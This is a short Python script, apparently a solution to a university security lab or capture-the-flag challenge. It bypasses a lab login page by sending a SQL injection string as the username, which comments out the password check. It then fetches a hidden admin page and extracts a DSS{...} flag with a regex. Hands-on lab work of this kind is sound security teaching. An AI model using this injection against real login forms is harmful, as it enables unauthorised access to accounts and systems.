import requests
import re
import os

# Please set your token in the terminal using `export DSS_AUTH_TOKEN=<YOUR-TOKEN>`.
#   DO NOT HARDCODE your token!
TOKEN = os.environ.get("DSS_AUTH_TOKEN")
headers = {
    "DSS-AUTH-TOKEN": TOKEN
}
LOGIN_URL = "https://0xa0.labs.dss.edu.distrinet-research.be/login"
ADMIN_URL = "https://0xa0.labs.dss.edu.distrinet-research.be/very-secret-and-unknown-admin-page"

# requests.Sesstion() makes sure cookies that are being set are automagically stored
#   and attached to the subsequent requests where necessary.
# You might need to url-encode the data/url depending on the request
#  Use cyberchef to do this: https://gchq.github.io/CyberChef/
with requests.Session() as s:
    login_response = s.post(LOGIN_URL, headers=headers, data={"username":'admin" --',"password":"pass"})
    #print(login_response)
    admin_response = s.get(ADMIN_URL, headers=headers)

    if admin_response.status_code == 200:
        # You can use re.search to find the flag format in the response
        flag_match = re.search(r"DSS{.*}", admin_response.text)

        if flag_match:
            print(flag_match.group(0))
